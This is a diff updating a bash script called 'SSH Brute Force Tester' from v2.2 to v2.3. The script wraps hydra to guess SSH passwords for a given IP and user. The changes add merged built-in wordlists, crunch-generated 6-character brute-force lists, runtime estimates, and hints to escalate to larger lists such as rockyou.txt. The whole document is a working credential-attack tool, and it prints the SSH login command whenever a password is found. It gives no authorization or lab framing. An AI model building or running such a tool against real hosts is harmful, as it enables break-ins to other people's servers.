@@ -1,10 +1,23 @@
 #!/bin/bash
-# SSH Brute Force Tester v2.2
+# SSH Brute Force Tester v2.3
 # Usage: ./ssh-brute.sh <ip> <user> [wordlist] [port]
+#
+# Wordlists (auto-detected in script dir):
+#   wordlist.txt         — 363 common passwords (fast, seconds)
+#   wordlist-keyboard.txt — 320 keyboard/name/date patterns (fast)
+#   all                  — merge both (670 passwords)
+#   crunch 6lower        — all 6-char lowercase (308M, ~hours)
+#   crunch 6alnum        — all 6-char alphanumeric (2.1B, ~days)
+#   /path/to/custom.txt  — any custom wordlist
 
-IP="${1:?Usage: $0 <ip> <user> [wordlist] [port]}"
+IP="${1:?Usage: $0 <ip> <user> [wordlist] [port]
+  wordlists:
+    all            — merge built-in (670 passwords)
+    crunch 6lower  — 308M 6-char lowercase
+    crunch 6alnum  — 2.1B 6-char alphanumeric
+    /path/to/file  — custom wordlist"}'
 USER="${2:?Usage: $0 <ip> <user> [wordlist] [port]}"
-WORDLIST="${3:-}"
+WORDLIST_ARG="${3:-all}"
 PORT="${4:-22}"
 LOG="${TMPDIR:-/tmp}/ssh-brute-$(date +%Y%m%d-%H%M%S).log"
 TIMEOUT=300
@@ -18,7 +31,7 @@ NC='\033[0m'
 log() { echo -e "$1" | tee -a "$LOG"; }
 strip_ansi() { echo "$1" | sed 's/\x1b\[[0-9;]*m//g'; }
 
-log "${YELLOW}=== SSH Brute Force Tester v2.2 ===${NC}"
+log "${YELLOW}=== SSH Brute Force Tester v2.3 ===${NC}"
 log "Target: ${RED}$IP:$PORT${NC}"
 log "User:   ${RED}$USER${NC}"
 log "Log:    $LOG"
@@ -39,24 +52,57 @@ fi
 
 # === Wordlist selection ===
 SCRIPT_DIR="$(cd "$(dirname "$(readlink -f "$0" 2>/dev/null || echo "$0")")" && pwd)"
-BUILTIN_BIG="$SCRIPT_DIR/wordlist.txt"
+WL_COMMON="$SCRIPT_DIR/wordlist.txt"
+WL_KEYBOARD="$SCRIPT_DIR/wordlist-keyboard.txt"
+WL_MERGED="${TMPDIR:-/tmp}/ssh-brute-merged.txt"
 
-if [ -n "$WORDLIST" ]; then
-    if [ ! -f "$WORDLIST" ]; then
-        log "${RED}[!] Wordlist not found: $WORDLIST${NC}"
+generate_crunch() {
+    local type="$1"
+    local outfile="${TMPDIR:-/tmp}/ssh-brute-crunch-${type}.txt"
+    if [ -f "$outfile" ] && [ -s "$outfile" ]; then
+        echo "$outfile"
+        return
+    fi
+    log "${YELLOW}[*] Generating crunch wordlist ($type)...${NC}"
+    if ! command -v crunch &>/dev/null; then
+        log "${RED}[!] crunch not installed${NC}"
+        log "${RED}    Ubuntu: sudo apt install crunch -y${NC}"
+        log "${RED}    Termux: pkg install crunch -y${NC}"
         exit 1
     fi
-    if [ ! -s "$WORDLIST" ]; then
-        log "${RED}[!] Wordlist is empty: $WORDLIST${NC}"
-        exit 1
-    fi
-    log "${GREEN}[*] Custom wordlist: $WORDLIST${NC}"
-elif [ -f "$BUILTIN_BIG" ] && [ -s "$BUILTIN_BIG" ]; then
-    WORDLIST="$BUILTIN_BIG"
-    log "${GREEN}[*] Using built-in wordlist ($BUILTIN_BIG)${NC}"
-else
-    log "${RED}[!] No wordlist found. Generate one:${NC}"
-    log "${RED}    crunch 6 8 abcdefghijklmnopqrstuvwxyz1234567890 -o wordlist.txt${NC}"
+    case "$type" in
+        6lower) crunch 6 6 abcdefghijklmnopqrstuvwxyz -o "$outfile" 2>/dev/null ;;
+        6alnum) crunch 6 6 abcdefghijklmnopqrstuvwxyz0123456789 -o "$outfile" 2>/dev/null ;;
+        *) log "${RED}[!] Unknown crunch type: $type${NC}"; exit 1 ;;
+    esac
+    echo "$outfile"
+}
+
+case "$WORDLIST_ARG" in
+    all)
+        # Merge all built-in wordlists
+        cat "$WL_COMMON" "$WL_KEYBOARD" > "$WL_MERGED" 2>/dev/null || true
+        sort -u "$WL_MERGED" -o "$WL_MERGED"
+        WORDLIST="$WL_MERGED"
+        log "${GREEN}[*] Using all built-in wordlists${NC}"
+        ;;
+    crunch\ 6lower)
+        WORDLIST=$(generate_crunch "6lower")
+        ;;
+    crunch\ 6alnum)
+        WORDLIST=$(generate_crunch "6alnum")
+        ;;
+    *)
+        WORDLIST="$WORDLIST_ARG"
+        ;;
+esac
+
+if [ ! -f "$WORDLIST" ]; then
+    log "${RED}[!] Wordlist not found: $WORDLIST${NC}"
+    exit 1
+fi
+if [ ! -s "$WORDLIST" ]; then
+    log "${RED}[!] Wordlist is empty: $WORDLIST${NC}"
     exit 1
 fi
 
@@ -94,11 +140,23 @@ if [ "$COUNT" -eq 0 ]; then
     exit 1
 fi
 
+# Estimate time (rough: ~4 attempts/sec with 4 threads)
+EST_SEC=$((COUNT / 4))
+EST_MIN=$((EST_SEC / 60))
+
 log "${YELLOW}[2/3] Wordlist: $COUNT passwords${NC}"
+if [ $EST_MIN -gt 60 ]; then
+    EST_HR=$((EST_MIN / 60))
+    log "${YELLOW}       Estimated time: ~${EST_HR}h${NC}"
+elif [ $EST_MIN -gt 0 ]; then
+    log "${YELLOW}       Estimated time: ~${EST_MIN}min${NC}"
+else
+    log "${YELLOW}       Estimated time: ~${EST_SEC}sec${NC}"
+fi
 log "${YELLOW}[3/3] Starting brute force (timeout ${TIMEOUT}s)...${NC}"
 log ""
 
-# Auto-detect thread count (Termux = 2, desktop = 4)
+# Auto-detect thread count
 if [ -d "/data/data/com.termux" ]; then
     THREADS=2
 else
@@ -109,7 +167,6 @@ FOUND_LINE=""
 HYDRA_EXIT=0
 
 while IFS= read -r line; do
-    # Bash string matching instead of spawning grep subprocess
     if [[ "$line" == *"host:"* ]]; then
         FOUND_LINE="$line"
         log ""
@@ -118,7 +175,6 @@ while IFS= read -r line; do
         log "${GREEN}╚════════════════════════════════════════════╝${NC}"
         log "${GREEN}[FOUND] $line${NC}"
         log "${GREEN}[CMD]   ssh -p $PORT $USER@$IP${NC}"
-        # Strip ANSI for clean log
         strip_ansi "$line" >> "$LOG.clean"
     elif [[ "$line" == *"[ATTEMPT]"* ]]; then
         attempt=$(echo "$line" | sed -n 's/.*login: //p')
@@ -126,7 +182,6 @@ while IFS= read -r line; do
     elif [[ "$line" == *"ERROR"* ]]; then
         log "${RED}[ERR] $line${NC}"
     fi
-    # Log raw output (stripped of ANSI) for clean file
     strip_ansi "$line" >> "$LOG.raw"
 done < <(timeout "$TIMEOUT" hydra -l "$USER" -P "$WORDLIST" -t "$THREADS" -f -V -s "$PORT" "$IP" ssh 2>&1) || HYDRA_EXIT=$?
 
@@ -136,18 +191,22 @@ log ""
 # === Results ===
 if [ $HYDRA_EXIT -eq 124 ]; then
     log "${RED}[!] Timed out after ${TIMEOUT} seconds${NC}"
+    log "${RED}    Only partial wordlist tried. Increase timeout:${NC}"
+    log "${RED}    TIMEOUT=600 ./ssh-brute.sh $IP $USER $WORDLIST_ARG $PORT${NC}"
 elif [ -n "$FOUND_LINE" ]; then
     log "${GREEN}[+] SSH: ssh -p $PORT $USER@$IP${NC}"
 elif [ $HYDRA_EXIT -eq 0 ] || [ $HYDRA_EXIT -eq 1 ]; then
-    log "${YELLOW}[-] No password found in wordlist ($COUNT tried)${NC}"
+    log "${YELLOW}[-] No password found ($COUNT tried)${NC}"
     log "${YELLOW}[-] Try bigger wordlist:${NC}"
-    log "${YELLOW}    crunch 8 8 abcdefghijklmnopqrstuvwxyz1234567890 -o big.txt${NC}"
-    log "${YELLOW}    ./ssh-brute.sh $IP $USER big.txt $PORT${NC}"
+    log "${YELLOW}    ./ssh-brute.sh $IP $USER 'crunch 6lower' $PORT${NC}"
+    log "${YELLOW}    ./ssh-brute.sh $IP $USER 'crunch 6alnum' $PORT${NC}"
+    log "${YELLOW}    pkg install wordlists${NC}"
+    log "${YELLOW}    ./ssh-brute.sh $IP $USER /usr/share/wordlists/rockyou.txt $PORT${NC}"
 else
     log "${RED}[!] Hydra exited with code $HYDRA_EXIT${NC}"
 fi
 
 log "${YELLOW}=== Scan Complete ===${NC}"
 log "Log: $LOG"
-log "Clean log: $LOG.clean"
-log "Raw log: $LOG.raw"
+[ -f "$LOG.clean" ] && log "Clean: $LOG.clean"
+[ -f "$LOG.raw" ] && log "Raw: $LOG.raw"
